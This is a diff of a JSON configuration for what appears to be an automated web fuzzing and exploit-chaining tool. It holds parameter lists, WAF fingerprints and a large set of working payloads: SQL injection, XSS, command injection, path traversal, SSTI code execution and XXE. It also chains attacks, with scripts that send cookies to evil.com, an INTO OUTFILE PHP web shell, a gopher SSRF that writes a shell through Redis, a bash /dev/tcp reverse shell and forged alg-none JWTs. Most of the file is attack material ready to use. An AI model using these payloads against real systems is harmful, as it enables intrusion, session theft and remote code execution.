@@ -1,514 +1,831 @@
 {
-    "FUZZ_POINTS": [
+  "FUZZ_POINTS": [
+    "username",
+    "password",
+    "email",
+    "token",
+    "session",
+    "auth",
+    "user",
+    "admin",
+    "role",
+    "privilege",
+    "access",
+    "id",
+    "uid",
+    "user_id",
+    "account_id",
+    "order_id",
+    "product_id",
+    "page",
+    "post_id",
+    "comment_id",
+    "file_id",
+    "category_id",
+    "file",
+    "path",
+    "filename",
+    "name",
+    "template",
+    "layout",
+    "document",
+    "image",
+    "attachment",
+    "upload",
+    "search",
+    "query",
+    "q",
+    "keyword",
+    "filter",
+    "sort",
+    "order",
+    "limit",
+    "offset",
+    "start",
+    "end",
+    "from",
+    "to",
+    "price",
+    "amount",
+    "quantity",
+    "discount",
+    "coupon",
+    "promo",
+    "currency",
+    "value",
+    "points",
+    "balance",
+    "credit",
+    "api_key",
+    "api_token",
+    "client_id",
+    "client_secret",
+    "callback",
+    "redirect",
+    "return_url",
+    "next",
+    "continue",
+    "X-Forwarded-For",
+    "X-Real-IP",
+    "X-API-Key",
+    "Authorization",
+    "content",
+    "body",
+    "description",
+    "title",
+    "summary",
+    "comment",
+    "message",
+    "text",
+    "html",
+    "json",
+    "xml",
+    "debug",
+    "test",
+    "dev",
+    "env",
+    "lang",
+    "locale",
+    "timezone",
+    "hook",
+    "endpoint",
+    "format",
+    "type",
+    "mode",
+    "url",
+    "uri",
+    "host",
+    "domain",
+    "ip",
+    "port",
+    "dest",
+    "target",
+    "webhook",
+    "jwt",
+    "assertion",
+    "query",
+    "variables",
+    "operationName",
+    "mutation",
+    "subscription"
+  ],
+  "FUZZ_PAYLOADS": {
+    "sql_injection": [
+      "'",
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "'; DROP TABLE users--",
+      "1' AND '1'='1",
+      "1 OR 1=1",
+      "admin'--",
+      "' UNION SELECT NULL--",
+      "1' WAITFOR DELAY '0:0:5'--",
+      "1' AND SLEEP(5)--",
+      "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
+    ],
+    "xss": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "javascript:alert(1)",
+      "<iframe src=javascript:alert(1)>",
+      "'><img src=x onerror=alert(1)>",
+      "\"><script>alert(1)</script>",
+      "${alert(1)}",
+      "{{7*7}}"
+    ],
+    "command_injection": [
+      "; ls",
+      "| ls",
+      "& ls",
+      "`ls`",
+      "$(ls)",
+      "\nls",
+      "; cat /etc/passwd",
+      "| whoami",
+      "& id",
+      "`id`"
+    ],
+    "path_traversal": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "....//....//....//etc/passwd",
+      "..%2F..%2F..%2Fetc%2Fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    ],
+    "ssti": [
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "#{7*7}",
+      "{{config}}",
+      "{{''.__class__.__mro__[2].__subclasses__()}}"
+    ],
+    "xxe": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]>"
+    ],
+    "idor": [
+      "1",
+      "2",
+      "3",
+      "0",
+      "-1",
+      "999999",
+      "admin",
+      "root",
+      "user1",
+      "user2",
+      "../..",
+      "%2e%2e%2f"
+    ],
+    "race_condition": [
+      "1",
+      "2",
+      "3",
+      "10",
+      "100"
+    ],
+    "parameter_pollution": [
+      "id=1&id=2",
+      "id=1&id=1",
+      "id=1;id=2",
+      "id=1%26id=2"
+    ],
+    "mass_assignment": [
+      "role=admin",
+      "is_admin=true",
+      "admin=true",
+      "privilege=1",
+      "role=user&role=admin",
+      "user[role]=admin",
+      "user[admin]=1"
+    ],
+    "ssrf": [
+      "http://127.0.0.1",
+      "http://localhost",
+      "http://[::1]",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://0.0.0.0",
+      "file:///etc/passwd",
+      "dict://127.0.0.1:11211/stat",
+      "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$18%0d%0a%0a%0a%3c%3fphp%20phpinfo()%3b%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0a",
+      "http://127.0.0.1.nip.io",
+      "http://2130706433/"
+    ],
+    "jwt": [
+      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",
+      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature_using_public_key_as_secret",
+      "header.payload.",
+      "header.payload"
+    ],
+    "graphql": [
+      "fragment a on __Schema{directives{name}} query{__schema{...a}}",
+      "query{__schema{types{name,fields{name,description}}}}",
+      "mutation{updateProfile(input:{role:\"ADMIN\"}){user{id,role}}}",
+      "query{users(limit:1000){id,name}}",
+      "query{user(id:\"1\"){id,name,email,passwordHash}}"
+    ]
+  },
+  "VULNERABLE_PATTERNS": {
+    "sql_error": [
+      "sql syntax",
+      "mysql_fetch",
+      "pg_query",
+      "ORA-",
+      "sqlite_",
+      "syntax error near",
+      "unclosed quotation",
+      "unterminated string",
+      "you have an error in your sql"
+    ],
+    "generic_error": [
+      "fatal error",
+      "parse error",
+      "internal server error"
+    ],
+    "code_execution": [
+      "traceback (most recent call last)",
+      "undefined function",
+      "call to undefined",
+      "nameerror:",
+      "attributeerror:",
+      "typeerror:"
+    ],
+    "time_based": [
+      "sleep",
+      "benchmark",
+      "waitfor delay"
+    ],
+    "out_of_band": [
+      "dns lookup",
+      "http request to",
+      "smtp connection"
+    ]
+  },
+  "WAF_SIGNATURES": {
+    "cloudflare": {
+      "headers": [
+        "cf-ray",
+        "cf-cache-status",
+        "__cfduid"
+      ],
+      "body_patterns": [
+        "cloudflare",
+        "ray id:"
+      ],
+      "status_codes": [
+        403,
+        1020
+      ]
+    },
+    "akamai": {
+      "headers": [
+        "x-akamai-transformed",
+        "akamai-grn"
+      ],
+      "body_patterns": [
+        "access denied",
+        "reference #"
+      ],
+      "status_codes": [
+        403
+      ]
+    },
+    "aws_waf": {
+      "headers": [
+        "x-amzn-requestid",
+        "x-amz-cf-id"
+      ],
+      "body_patterns": [
+        "request blocked",
+        "aws waf"
+      ],
+      "status_codes": [
+        403
+      ]
+    },
+    "modsecurity": {
+      "headers": [
+        "x-modsecurity-detected"
+      ],
+      "body_patterns": [
+        "mod_security",
+        "not acceptable"
+      ],
+      "status_codes": [
+        406,
+        403
+      ]
+    },
+    "imperva": {
+      "headers": [
+        "x-iinfo",
+        "x-cdn"
+      ],
+      "body_patterns": [
+        "incapsula",
+        "imperva"
+      ],
+      "status_codes": [
+        403
+      ]
+    }
+  },
+  "CHAIN_RULES": {
+    "xss": [
+      "csrf",
+      "session_hijacking",
+      "account_takeover"
+    ],
+    "sql_injection": [
+      "auth_bypass",
+      "data_exfiltration",
+      "rce_via_outfile"
+    ],
+    "idor": [
+      "privilege_escalation",
+      "data_exfiltration",
+      "mass_assignment"
+    ],
+    "ssti": [
+      "rce",
+      "path_traversal",
+      "data_exfiltration"
+    ],
+    "path_traversal": [
+      "lfi",
+      "rce_via_log_poison",
+      "config_disclosure"
+    ],
+    "xxe": [
+      "ssrf",
+      "rce",
+      "data_exfiltration"
+    ],
+    "race_condition": [
+      "double_spend",
+      "auth_bypass",
+      "quota_bypass"
+    ],
+    "mass_assignment": [
+      "privilege_escalation",
+      "auth_bypass"
+    ],
+    "command_injection": [
+      "rce",
+      "reverse_shell",
+      "data_exfiltration"
+    ],
+    "graphql": [
+      "information_disclosure",
+      "idor",
+      "mass_assignment",
+      "dos_via_complex_query"
+    ]
+  },
+  "CHAIN_PAYLOADS": {
+    "csrf": [
+      "<form action='{target}' method=POST><input type=submit></form>"
+    ],
+    "session_hijacking": [
+      "'; document.location='http://evil.com/?c='+document.cookie//"
+    ],
+    "account_takeover": [
+      "<script>fetch('/api/change-email',{method:'POST',body:'email=hacker@evil.com'})</script>"
+    ],
+    "auth_bypass": [
+      "admin'--",
+      "' OR '1'='1'--",
+      "admin'/*",
+      "') OR ('1'='1"
+    ],
+    "data_exfiltration": [
+      "' UNION SELECT username,password FROM users--",
+      "' UNION SELECT table_name,2 FROM information_schema.tables--"
+    ],
+    "rce_via_outfile": [
+      "' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
+    ],
+    "privilege_escalation": [
+      "role=admin",
+      "is_admin=1",
+      "user[role]=admin"
+    ],
+    "rce": [
+      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    ],
+    "path_traversal": [
+      "../../../etc/passwd",
+      "....//....//....//etc/passwd"
+    ],
+    "lfi": [
+      "../../../etc/passwd",
+      "/proc/self/environ",
+      "php://filter/convert.base64-encode/resource=index.php"
+    ],
+    "rce_via_log_poison": [
+      "<?php system($_GET['c']); ?>"
+    ],
+    "config_disclosure": [
+      "../../../config.php",
+      "../../../.env",
+      "../../../wp-config.php"
+    ],
+    "ssrf": [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://localhost/admin",
+      "http://127.0.0.1:6379/"
+    ],
+    "double_spend": [
+      "amount=-1",
+      "quantity=0",
+      "price=0.001"
+    ],
+    "auth_bypass_race": [
+      "token=AAAA",
+      "session=0"
+    ],
+    "quota_bypass": [
+      "limit=99999",
+      "remaining=-1"
+    ],
+    "reverse_shell": [
+      "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
+    ],
+    "mass_assignment": [
+      "role=admin&is_admin=1&privilege=1"
+    ],
+    "information_disclosure": [
+      "query{__schema{types{name}}}"
+    ],
+    "dos_via_complex_query": [
+      "query{author(id:1){posts{author{posts{author{posts{title}}}}}}}"
+    ]
+  },
+  "_SEVERITY_ORDER": [
+    "info",
+    "low",
+    "medium",
+    "high",
+    "critical"
+  ],
+  "PARAM_TYPE_MAP": {
+    "IDOR": [
+      "id",
+      "user_id",
+      "uid",
+      "userid",
+      "account_id",
+      "order_id",
+      "item_id",
+      "pid",
+      "cid",
+      "rid",
+      "record_id",
+      "object_id",
+      "doc_id",
+      "file_id",
+      "product_id",
+      "customer_id",
+      "profile_id",
+      "post_id",
+      "comment_id",
+      "category_id",
+      "group_id",
+      "invoice_id",
+      "ticket_id",
+      "message_id"
+    ],
+    "SSRF": [
+      "url",
+      "link",
+      "src",
+      "source",
+      "host",
+      "webhook",
+      "proxy",
+      "endpoint",
+      "api",
+      "feed",
+      "import",
+      "export",
+      "uri",
+      "domain",
+      "hook"
+    ],
+    "OPEN_REDIRECT": [
+      "redirect",
+      "next",
+      "return",
+      "goto",
+      "dest",
+      "destination",
+      "callback",
+      "return_url",
+      "continue",
+      "target",
+      "redir",
+      "aredirurl",
+      "returnurl",
+      "redirecturl",
+      "nexturl",
+      "gotourl",
+      "out",
+      "back",
+      "to",
+      "r",
+      "u",
+      "ret",
+      "go",
+      "q",
+      "jump",
+      "forward",
+      "location",
+      "from",
+      "nav"
+    ],
+    "PATH_TRAVERSAL": [
+      "file",
+      "path",
+      "filepath",
+      "page",
+      "include",
+      "template",
+      "view",
+      "load",
+      "dir",
+      "folder",
+      "document",
+      "module",
+      "layout",
+      "conf",
+      "filename",
+      "image",
+      "attachment",
+      "upload",
+      "document"
+    ],
+    "SQLi_XSS": [
+      "search",
+      "query",
+      "q",
+      "keyword",
+      "filter",
+      "where",
+      "sort",
+      "order",
+      "name",
+      "username",
+      "email",
+      "title",
+      "content",
+      "message",
+      "comment",
+      "description",
+      "text",
+      "input",
+      "value",
+      "data",
+      "term",
+      "s",
+      "body",
+      "summary",
+      "html",
+      "json",
+      "xml"
+    ],
+    "AUTH": [
+      "username",
+      "password",
+      "email",
+      "token",
+      "session",
+      "auth",
+      "user",
+      "admin",
+      "role",
+      "privilege",
+      "access",
+      "api_key",
+      "api_token",
+      "client_id",
+      "client_secret",
+      "jwt",
+      "assertion"
+    ],
+    "BUSINESS_LOGIC": [
+      "price",
+      "amount",
+      "quantity",
+      "discount",
+      "coupon",
+      "promo",
+      "currency",
+      "points",
+      "balance",
+      "credit",
+      "limit",
+      "offset",
+      "start",
+      "end",
+      "from",
+      "to"
+    ]
+  },
+  "TECH_PAYLOAD_AUGMENTS": {
+    "sql_injection": {
+      "mysql": [
+        "' OR 1=1-- ",
+        "UNION SELECT NULL-- ",
+        "WAITFOR DELAY '0:0:5'-- "
+      ],
+      "postgresql": [
+        "' OR 1=1-- ",
+        "UNION SELECT NULL-- ",
+        "pg_sleep(5)-- "
+      ],
+      "mssql": [
+        "' OR 1=1-- ",
+        "UNION SELECT NULL-- ",
+        "; EXEC xp_cmdshell('id')-- "
+      ],
+      "sql server": [
+        "' OR 1=1-- ",
+        "UNION SELECT NULL-- ",
+        "; EXEC xp_cmdshell('id')-- "
+      ]
+    },
+    "xss": {
+      "django": [
+        "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+      ],
+      "rails": [
+        "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+      ],
+      "express": [
+        "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+      ]
+    },
+    "command_injection": {
+      "windows": [
+        "& dir",
+        "| type C:\\Windows\\win.ini",
+        "&& whoami"
+      ],
+      "iis": [
+        "& dir",
+        "| type C:\\Windows\\win.ini",
+        "&& whoami"
+      ],
+      "nginx": [
+        "; cat /etc/passwd",
+        "| id",
+        "&& uname -a"
+      ],
+      "apache": [
+        "; cat /etc/passwd",
+        "| id",
+        "&& uname -a"
+      ]
+    },
+    "path_traversal": {
+      "windows": [
+        "..\\..\\..\\..\\Windows\\win.ini",
+        "%2e%2e%5c%2e%2e%5c"
+      ],
+      "iis": [
+        "..\\..\\..\\..\\Windows\\win.ini",
+        "%2e%2e%5c%2e%2e%5c"
+      ],
+      "nginx": [
+        "..%2f..%2f..%2fetc%2fpasswd",
+        "....//....//etc/passwd"
+      ]
+    }
+  },
+  "PRIORITY_PARAM_HINTS": [
+    {
+      "url_keywords": [
+        "login",
+        "signin"
+      ],
+      "params": [
         "username",
         "password",
         "email",
-        "token",
-        "session",
-        "auth",
-        "user",
-        "admin",
-        "role",
-        "privilege",
-        "access",
-        "id",
-        "uid",
+        "token"
+      ]
+    },
+    {
+      "url_keywords": [
+        "profile",
+        "user"
+      ],
+      "params": [
         "user_id",
-        "account_id",
-        "order_id",
-        "product_id",
-        "page",
-        "post_id",
-        "comment_id",
-        "file_id",
-        "category_id",
+        "id",
+        "username",
+        "email",
+        "role"
+      ]
+    },
+    {
+      "url_keywords": [
+        "admin"
+      ],
+      "params": [
+        "id",
+        "user_id",
+        "action",
+        "page"
+      ]
+    },
+    {
+      "url_keywords": [
+        "search",
+        "query"
+      ],
+      "params": [
+        "q",
+        "query",
+        "search",
+        "keyword"
+      ]
+    },
+    {
+      "url_keywords": [
+        "api"
+      ],
+      "params": [
+        "api_key",
+        "token",
+        "id",
+        "action"
+      ]
+    },
+    {
+      "url_keywords": [
+        "file",
+        "download",
+        "upload"
+      ],
+      "params": [
         "file",
         "path",
         "filename",
         "name",
-        "template",
-        "layout",
-        "document",
-        "image",
-        "attachment",
-        "upload",
-        "search",
-        "query",
-        "q",
-        "keyword",
-        "filter",
-        "sort",
-        "order",
-        "limit",
-        "offset",
-        "start",
-        "end",
-        "from",
-        "to",
+        "template"
+      ]
+    },
+    {
+      "url_keywords": [
+        "pay",
+        "checkout",
+        "order"
+      ],
+      "params": [
         "price",
         "amount",
         "quantity",
-        "discount",
         "coupon",
-        "promo",
-        "currency",
-        "value",
-        "points",
-        "balance",
-        "credit",
-        "api_key",
-        "api_token",
-        "client_id",
-        "client_secret",
-        "callback",
-        "redirect",
-        "return_url",
-        "next",
-        "continue",
-        "X-Forwarded-For",
-        "X-Real-IP",
-        "X-API-Key",
-        "Authorization",
-        "content",
-        "body",
-        "description",
-        "title",
-        "summary",
-        "comment",
-        "message",
-        "text",
-        "html",
-        "json",
-        "xml",
-        "debug",
-        "test",
-        "dev",
-        "env",
-        "lang",
-        "locale",
-        "timezone",
-        "hook",
-        "endpoint",
-        "format",
-        "type",
-        "mode",
-        "url",
-        "uri",
-        "host",
-        "domain",
-        "ip",
-        "port",
-        "dest",
-        "target",
-        "webhook",
-        "jwt",
-        "assertion",
-        "query",
-        "variables",
-        "operationName",
-        "mutation",
-        "subscription"
-    ],
-    "FUZZ_PAYLOADS": {
-        "sql_injection": [
-            "'",
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "'; DROP TABLE users--",
-            "1' AND '1'='1",
-            "1 OR 1=1",
-            "admin'--",
-            "' UNION SELECT NULL--",
-            "1' WAITFOR DELAY '0:0:5'--",
-            "1' AND SLEEP(5)--",
-            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
-        ],
-        "xss": [
-            "<script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>",
-            "javascript:alert(1)",
-            "<iframe src=javascript:alert(1)>",
-            "'><img src=x onerror=alert(1)>",
-            "\"><script>alert(1)</script>",
-            "${alert(1)}",
-            "{{7*7}}"
-        ],
-        "command_injection": [
-            "; ls",
-            "| ls",
-            "& ls",
-            "`ls`",
-            "$(ls)",
-            "\nls",
-            "; cat /etc/passwd",
-            "| whoami",
-            "& id",
-            "`id`"
-        ],
-        "path_traversal": [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-            "....//....//....//etc/passwd",
-            "..%2F..%2F..%2Fetc%2Fpasswd",
-            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
-        ],
-        "ssti": [
-            "{{7*7}}",
-            "${7*7}",
-            "<%= 7*7 %>",
-            "#{7*7}",
-            "{{config}}",
-            "{{''.__class__.__mro__[2].__subclasses__()}}"
-        ],
-        "xxe": [
-            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
-            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]>"
-        ],
-        "idor": [
-            "1",
-            "2",
-            "3",
-            "0",
-            "-1",
-            "999999",
-            "admin",
-            "root",
-            "user1",
-            "user2",
-            "../..",
-            "%2e%2e%2f"
-        ],
-        "race_condition": [
-            "1",
-            "2",
-            "3",
-            "10",
-            "100"
-        ],
-        "parameter_pollution": [
-            "id=1&id=2",
-            "id=1&id=1",
-            "id=1;id=2",
-            "id=1%26id=2"
-        ],
-        "mass_assignment": [
-            "role=admin",
-            "is_admin=true",
-            "admin=true",
-            "privilege=1",
-            "role=user&role=admin",
-            "user[role]=admin",
-            "user[admin]=1"
-        ],
-        "ssrf": [
-            "http://127.0.0.1",
-            "http://localhost",
-            "http://[::1]",
-            "http://169.254.169.254/latest/meta-data/",
-            "http://0.0.0.0",
-            "file:///etc/passwd",
-            "dict://127.0.0.1:11211/stat",
-            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$18%0d%0a%0a%0a%3c%3fphp%20phpinfo()%3b%3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$14%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0a",
-            "http://127.0.0.1.nip.io",
-            "http://2130706433/"
-        ],
-        "jwt": [
-            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",
-            "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
-            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature_using_public_key_as_secret",
-            "header.payload.",
-            "header.payload"
-        ],
-        "graphql": [
-            "fragment a on __Schema{directives{name}} query{__schema{...a}}",
-            "query{__schema{types{name,fields{name,description}}}}",
-            "mutation{updateProfile(input:{role:\"ADMIN\"}){user{id,role}}}",
-            "query{users(limit:1000){id,name}}",
-            "query{user(id:\"1\"){id,name,email,passwordHash}}"
-        ]
-    },
-    "VULNERABLE_PATTERNS": {
-        "sql_error": [
-            "sql syntax",
-            "mysql_fetch",
-            "pg_query",
-            "ORA-",
-            "sqlite_",
-            "syntax error near",
-            "unclosed quotation",
-            "unterminated string",
-            "you have an error in your sql"
-        ],
-        "generic_error": [
-            "fatal error",
-            "parse error",
-            "internal server error"
-        ],
-        "code_execution": [
-            "traceback (most recent call last)",
-            "undefined function",
-            "call to undefined",
-            "nameerror:",
-            "attributeerror:",
-            "typeerror:"
-        ],
-        "time_based": [
-            "sleep",
-            "benchmark",
-            "waitfor delay"
-        ],
-        "out_of_band": [
-            "dns lookup",
-            "http request to",
-            "smtp connection"
-        ]
-    },
-    "WAF_SIGNATURES": {
-        "cloudflare": {
-            "headers": [
-                "cf-ray",
-                "cf-cache-status",
-                "__cfduid"
-            ],
-            "body_patterns": [
-                "cloudflare",
-                "ray id:"
-            ],
-            "status_codes": [
-                403,
-                1020
-            ]
-        },
-        "akamai": {
-            "headers": [
-                "x-akamai-transformed",
-                "akamai-grn"
-            ],
-            "body_patterns": [
-                "access denied",
-                "reference #"
-            ],
-            "status_codes": [
-                403
-            ]
-        },
-        "aws_waf": {
-            "headers": [
-                "x-amzn-requestid",
-                "x-amz-cf-id"
-            ],
-            "body_patterns": [
-                "request blocked",
-                "aws waf"
-            ],
-            "status_codes": [
-                403
-            ]
-        },
-        "modsecurity": {
-            "headers": [
-                "x-modsecurity-detected"
-            ],
-            "body_patterns": [
-                "mod_security",
-                "not acceptable"
-            ],
-            "status_codes": [
-                406,
-                403
-            ]
-        },
-        "imperva": {
-            "headers": [
-                "x-iinfo",
-                "x-cdn"
-            ],
-            "body_patterns": [
-                "incapsula",
-                "imperva"
-            ],
-            "status_codes": [
-                403
-            ]
-        }
-    },
-    "CHAIN_RULES": {
-        "xss": [
-            "csrf",
-            "session_hijacking",
-            "account_takeover"
-        ],
-        "sql_injection": [
-            "auth_bypass",
-            "data_exfiltration",
-            "rce_via_outfile"
-        ],
-        "idor": [
-            "privilege_escalation",
-            "data_exfiltration",
-            "mass_assignment"
-        ],
-        "ssti": [
-            "rce",
-            "path_traversal",
-            "data_exfiltration"
-        ],
-        "path_traversal": [
-            "lfi",
-            "rce_via_log_poison",
-            "config_disclosure"
-        ],
-        "xxe": [
-            "ssrf",
-            "rce",
-            "data_exfiltration"
-        ],
-        "race_condition": [
-            "double_spend",
-            "auth_bypass",
-            "quota_bypass"
-        ],
-        "mass_assignment": [
-            "privilege_escalation",
-            "auth_bypass"
-        ],
-        "command_injection": [
-            "rce",
-            "reverse_shell",
-            "data_exfiltration"
-        ],
-        "graphql": [
-            "information_disclosure",
-            "idor",
-            "mass_assignment",
-            "dos_via_complex_query"
-        ]
-    },
-    "CHAIN_PAYLOADS": {
-        "csrf": [
-            "<form action='{target}' method=POST><input type=submit></form>"
-        ],
-        "session_hijacking": [
-            "'; document.location='http://evil.com/?c='+document.cookie//"
-        ],
-        "account_takeover": [
-            "<script>fetch('/api/change-email',{method:'POST',body:'email=hacker@evil.com'})</script>"
-        ],
-        "auth_bypass": [
-            "admin'--",
-            "' OR '1'='1'--",
-            "admin'/*",
-            "') OR ('1'='1"
-        ],
-        "data_exfiltration": [
-            "' UNION SELECT username,password FROM users--",
-            "' UNION SELECT table_name,2 FROM information_schema.tables--"
-        ],
-        "rce_via_outfile": [
-            "' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
-        ],
-        "privilege_escalation": [
-            "role=admin",
-            "is_admin=1",
-            "user[role]=admin"
-        ],
-        "rce": [
-            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
-            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
-        ],
-        "path_traversal": [
-            "../../../etc/passwd",
-            "....//....//....//etc/passwd"
-        ],
-        "lfi": [
-            "../../../etc/passwd",
-            "/proc/self/environ",
-            "php://filter/convert.base64-encode/resource=index.php"
-        ],
-        "rce_via_log_poison": [
-            "<?php system($_GET['c']); ?>"
-        ],
-        "config_disclosure": [
-            "../../../config.php",
-            "../../../.env",
-            "../../../wp-config.php"
-        ],
-        "ssrf": [
-            "http://169.254.169.254/latest/meta-data/",
-            "http://localhost/admin",
-            "http://127.0.0.1:6379/"
-        ],
-        "double_spend": [
-            "amount=-1",
-            "quantity=0",
-            "price=0.001"
-        ],
-        "auth_bypass_race": [
-            "token=AAAA",
-            "session=0"
-        ],
-        "quota_bypass": [
-            "limit=99999",
-            "remaining=-1"
-        ],
-        "reverse_shell": [
-            "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
-        ],
-        "mass_assignment": [
-            "role=admin&is_admin=1&privilege=1"
-        ],
-        "information_disclosure": [
-            "query{__schema{types{name}}}"
-        ],
-        "dos_via_complex_query": [
-            "query{author(id:1){posts{author{posts{author{posts{title}}}}}}}"
-        ]
-    },
-    "_SEVERITY_ORDER": [
-        "info",
-        "low",
-        "medium",
-        "high",
-        "critical"
-    ],
-    "PARAM_TYPE_MAP": {
-        "IDOR": [
-            "id", "user_id", "uid", "userid", "account_id", "order_id", "item_id",
-            "pid", "cid", "rid", "record_id", "object_id", "doc_id", "file_id",
-            "product_id", "customer_id", "profile_id", "post_id", "comment_id",
-            "category_id", "group_id", "invoice_id", "ticket_id", "message_id"
-        ],
-        "SSRF": [
-            "url", "link", "src", "source", "host", "webhook", "proxy",
-            "endpoint", "api", "feed", "import", "export", "uri", "domain", "hook"
-        ],
-        "OPEN_REDIRECT": [
-            "redirect", "next", "return", "goto", "dest", "destination", "callback",
-            "return_url", "continue", "target", "redir", "aredirurl", "returnurl",
-            "redirecturl", "nexturl", "gotourl", "out", "back", "to", "r", "u",
-            "ret", "go", "q", "jump", "forward", "location", "from", "nav"
-        ],
-        "PATH_TRAVERSAL": [
-            "file", "path", "filepath", "page", "include", "template", "view",
-            "load", "dir", "folder", "document", "module", "layout", "conf",
-            "filename", "image", "attachment", "upload", "document"
-        ],
-        "SQLi_XSS": [
-            "search", "query", "q", "keyword", "filter", "where", "sort", "order",
-            "name", "username", "email", "title", "content", "message", "comment",
-            "description", "text", "input", "value", "data", "term", "s",
-            "body", "summary", "html", "json", "xml"
-        ],
-        "AUTH": [
-            "username", "password", "email", "token", "session", "auth",
-            "user", "admin", "role", "privilege", "access", "api_key",
-            "api_token", "client_id", "client_secret", "jwt", "assertion"
-        ],
-        "BUSINESS_LOGIC": [
-            "price", "amount", "quantity", "discount", "coupon", "promo",
-            "currency", "points", "balance", "credit", "limit", "offset",
-            "start", "end", "from", "to"
-        ]
+        "discount"
+      ]
     }
+  ],
+  "CHAIN_FAMILY_FOLLOWONS": [
+    {
+      "members": [
+        "sql_injection",
+        "xss",
+        "ssti",
+        "command_injection",
+        "xxe",
+        "path_traversal",
+        "code_injection",
+        "template_injection"
+      ],
+      "follow_ons": [
+        "second_order_injection"
+      ]
+    },
+    {
+      "members": [
+        "open_redirect",
+        "ssrf",
+        "graphql",
+        "xss",
+        "http_smuggling",
+        "cache_poisoning"
+      ],
+      "follow_ons": [
+        "http_desync_cache"
+      ]
+    }
+  ]
 }
